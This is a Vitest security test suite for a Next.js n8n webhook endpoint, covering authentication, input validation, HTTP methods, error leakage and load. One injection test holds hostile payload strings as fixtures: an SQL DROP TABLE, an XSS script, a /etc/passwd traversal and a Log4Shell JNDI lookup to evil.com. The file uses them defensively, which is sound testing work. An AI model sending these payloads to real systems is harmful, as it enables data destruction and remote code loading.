// src/test/security/webhook-security.test.ts
// Implements Expert Council Security Expert recommendations
// Security Expert consensus: authentication validation and penetration testing

import { describe, test, expect } from 'vitest'

// Test configuration
const WEBHOOK_ENDPOINT = process.env.NEXT_PUBLIC_APP_URL 
  ? `${process.env.NEXT_PUBLIC_APP_URL}/api/webhooks/n8n`
  : 'http://localhost:3000/api/webhooks/n8n'

const TEST_WEBHOOK_SECRET = process.env.N8N_WEBHOOK_SECRET || 'test-secret'

// Valid test payload
const VALID_PAYLOAD = {
  automation_id: 'test-automation-id',
  user_id: 'test-user-id',
  execution_id: 'test-execution-id',
  final_status: 'success' as const,
  execution_time_ms: 1500,
  error_message: null,
}

describe('Webhook Security Validation', () => {
  describe('Authentication Security', () => {
    test('should reject requests without Authorization header', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(401)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Unauthorized webhook')
      expect(responseData.details).toBe('Invalid or missing Authorization header')
      
      console.log('✅ Correctly rejects requests without Authorization header')
    })

    test('should reject requests with invalid Authorization header', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer invalid-secret',
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(401)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Unauthorized webhook')
      
      console.log('✅ Correctly rejects requests with invalid Authorization header')
    })

    test('should accept requests with valid Bearer token format', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(200)
      
      console.log('✅ Correctly accepts requests with valid Bearer token')
    })

    test('should accept requests with direct token format', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': TEST_WEBHOOK_SECRET,
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(200)
      
      console.log('✅ Correctly accepts requests with direct token format')
    })

    test('should prevent timing attacks on authentication', async () => {
      // Test multiple invalid tokens to ensure consistent timing
      const invalidTokens = [
        'invalid-short',
        'invalid-medium-length-token',
        'invalid-very-long-token-that-exceeds-normal-length-significantly',
        '',
        'Bearer invalid',
        'invalid-token-with-special-chars-!@#$%^&*()',
      ]
      
      const timings: number[] = []
      
      for (const token of invalidTokens) {
        const startTime = performance.now()
        
        const response = await fetch(WEBHOOK_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': token,
          },
          body: JSON.stringify(VALID_PAYLOAD),
        })
        
        const endTime = performance.now()
        timings.push(endTime - startTime)
        
        expect(response.status).toBe(401)
      }
      
      // Validate timing consistency (should not vary significantly)
      const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length
      const maxDeviation = Math.max(...timings.map(t => Math.abs(t - avgTiming)))
      
      // Allow reasonable variance but prevent significant timing differences
      expect(maxDeviation).toBeLessThan(avgTiming * 0.5) // 50% variance threshold
      
      console.log(`✅ Authentication timing consistency validated (avg: ${avgTiming.toFixed(2)}ms, max deviation: ${maxDeviation.toFixed(2)}ms)`)
    })
  })

  describe('Input Validation Security', () => {
    test('should reject malformed JSON payloads', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
        body: '{ invalid json }',
      })
      
      expect(response.status).toBe(400)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Malformed JSON payload')
      
      console.log('✅ Correctly rejects malformed JSON payloads')
    })

    test('should reject payloads with missing required fields', async () => {
      const invalidPayloads = [
        {}, // Empty payload
        { automation_id: 'test' }, // Missing user_id
        { user_id: 'test' }, // Missing automation_id
        { automation_id: 'test', user_id: 'test' }, // Missing other required fields
      ]
      
      for (const payload of invalidPayloads) {
        const response = await fetch(WEBHOOK_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
          },
          body: JSON.stringify(payload),
        })
        
        expect(response.status).toBe(400)
        
        const responseData = await response.json()
        expect(responseData.error).toMatch(/Invalid payload format|Missing required fields/)
      }
      
      console.log('✅ Correctly rejects payloads with missing required fields')
    })

    test('should sanitize and validate input data types', async () => {
      const invalidTypePayloads = [
        {
          ...VALID_PAYLOAD,
          execution_time_ms: 'not-a-number', // Invalid type
        },
        {
          ...VALID_PAYLOAD,
          final_status: 'invalid-status', // Invalid enum value
        },
        {
          ...VALID_PAYLOAD,
          automation_id: null, // Null value
        },
        {
          ...VALID_PAYLOAD,
          user_id: 123, // Wrong type
        },
      ]
      
      for (const payload of invalidTypePayloads) {
        const response = await fetch(WEBHOOK_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
          },
          body: JSON.stringify(payload),
        })
        
        expect(response.status).toBe(400)
        
        const responseData = await response.json()
        expect(responseData.error).toBe('Invalid payload format')
      }
      
      console.log('✅ Correctly validates and rejects invalid data types')
    })

    test('should prevent injection attacks through payload fields', async () => {
      const injectionPayloads = [
        {
          ...VALID_PAYLOAD,
          execution_id: "'; DROP TABLE automation_runs; --",
        },
        {
          ...VALID_PAYLOAD,
          error_message: '<script>alert("xss")</script>',
        },
        {
          ...VALID_PAYLOAD,
          automation_id: '../../../etc/passwd',
        },
        {
          ...VALID_PAYLOAD,
          user_id: '${jndi:ldap://evil.com/a}',
        },
      ]
      
      for (const payload of injectionPayloads) {
        const response = await fetch(WEBHOOK_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
          },
          body: JSON.stringify(payload),
        })
        
        // Should either reject the payload or process it safely
        if (response.status === 200) {
          // If accepted, verify it was processed safely (no injection occurred)
          const responseData = await response.json()
          expect(responseData.success).toBe(true)
        } else {
          // If rejected, should be due to validation
          expect(response.status).toBe(400)
        }
      }
      
      console.log('✅ Injection attack prevention validated')
    })
  })

  describe('HTTP Method Security', () => {
    test('should reject GET requests', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
      })
      
      expect(response.status).toBe(405)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Method not allowed')
      
      console.log('✅ Correctly rejects GET requests')
    })

    test('should reject PUT requests', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(405)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Method not allowed')
      
      console.log('✅ Correctly rejects PUT requests')
    })

    test('should reject DELETE requests', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
      })
      
      expect(response.status).toBe(405)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Method not allowed')
      
      console.log('✅ Correctly rejects DELETE requests')
    })

    test('should reject PATCH requests', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(405)
      
      const responseData = await response.json()
      expect(responseData.error).toBe('Method not allowed')
      
      console.log('✅ Correctly rejects PATCH requests')
    })
  })

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in error messages', async () => {
      // Test various error scenarios to ensure no sensitive data leakage
      const errorScenarios = [
        {
          name: 'Invalid authentication',
          headers: { 'Authorization': 'Bearer invalid' },
          expectedStatus: 401,
        },
        {
          name: 'Missing content-type',
          headers: { 'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}` },
          expectedStatus: 400,
        },
        {
          name: 'Invalid JSON',
          headers: { 
            'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
            'Content-Type': 'application/json',
          },
          body: '{ invalid }',
          expectedStatus: 400,
        },
      ]
      
      for (const scenario of errorScenarios) {
        const response = await fetch(WEBHOOK_ENDPOINT, {
          method: 'POST',
          headers: scenario.headers,
          body: scenario.body || JSON.stringify(VALID_PAYLOAD),
        })
        
        expect(response.status).toBe(scenario.expectedStatus)
        
        const responseData = await response.json()
        
        // Verify error response structure
        expect(responseData).toHaveProperty('error')
        expect(responseData).toHaveProperty('timestamp')
        
        // Verify no sensitive information is leaked
        const responseText = JSON.stringify(responseData).toLowerCase()
        expect(responseText).not.toContain('password')
        expect(responseText).not.toContain('secret')
        expect(responseText).not.toContain('token')
        expect(responseText).not.toContain('key')
        expect(responseText).not.toContain('database')
        expect(responseText).not.toContain('internal')
        expect(responseText).not.toContain('stack')
        expect(responseText).not.toContain('trace')
      }
      
      console.log('✅ Error messages do not leak sensitive information')
    })

    test('should include request ID for tracing without exposing internal details', async () => {
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer invalid',
        },
        body: JSON.stringify(VALID_PAYLOAD),
      })
      
      expect(response.status).toBe(401)
      
      const responseData = await response.json()
      expect(responseData).toHaveProperty('request_id')
      expect(responseData.request_id).toMatch(/^req_\d+_[a-z0-9]+$/)
      
      console.log('✅ Request ID included for tracing without exposing internal details')
    })
  })

  describe('Rate Limiting and DoS Protection', () => {
    test('should handle multiple concurrent requests gracefully', async () => {
      // Test concurrent requests to ensure no race conditions or DoS vulnerabilities
      const concurrentRequests = 10
      const requests = Array.from({ length: concurrentRequests }, (_, i) =>
        fetch(WEBHOOK_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
          },
          body: JSON.stringify({
            ...VALID_PAYLOAD,
            execution_id: `concurrent-test-${i}`,
          }),
        })
      )
      
      const responses = await Promise.all(requests)
      
      // All requests should be processed successfully
      responses.forEach((response) => {
        expect(response.status).toBe(200)
      })
      
      console.log(`✅ Handled ${concurrentRequests} concurrent requests successfully`)
    }, 15000)

    test('should handle large payloads appropriately', async () => {
      // Test with a large but reasonable payload
      const largePayload = {
        ...VALID_PAYLOAD,
        error_message: 'A'.repeat(10000), // 10KB error message
        execution_id: 'large-payload-test',
      }
      
      const response = await fetch(WEBHOOK_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${TEST_WEBHOOK_SECRET}`,
        },
        body: JSON.stringify(largePayload),
      })
      
      // Should either accept the large payload or reject it gracefully
      expect([200, 400, 413]).toContain(response.status)
      
      if (response.status === 413) {
        const responseData = await response.json()
        expect(responseData.error).toContain('too large')
      }
      
      console.log('✅ Large payload handling validated')
    })
  })
})
